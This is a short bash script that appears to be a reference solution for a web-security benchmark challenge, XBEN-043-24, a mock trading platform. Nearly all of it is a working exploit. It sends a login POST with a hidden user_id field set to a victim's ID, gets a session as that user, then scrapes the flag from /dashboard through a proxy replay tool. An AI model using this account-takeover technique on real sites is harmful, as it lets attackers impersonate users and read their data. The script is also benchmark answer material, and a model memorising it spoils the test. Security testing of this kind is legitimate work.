#!/usr/bin/env bash
# XBEN-043-24 — "Trading Platform". Proxy-mode twin. The login POST trusts a
# `user_id` field the form never shows: set it to the victim and the session is
# issued as them, so /dashboard renders their data — and the flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
VICTIM="${2:-10001}"
SESSION="xben043p-$$"
cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"
go "$URL/"
BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" --as "$SESSION" \
  --set 'method=POST' --set 'path=/password/test' \
  --set 'form.password=test' --set "form.user_id=$VICTIM" >/dev/null
"$H5I" websec replay "$BASE" --create --session "$SESSION" --as "$SESSION" \
  --set 'method=GET' --set 'path=/dashboard' \
  --body 2>/dev/null | grep -oE "$FLAG_RE" | head -1
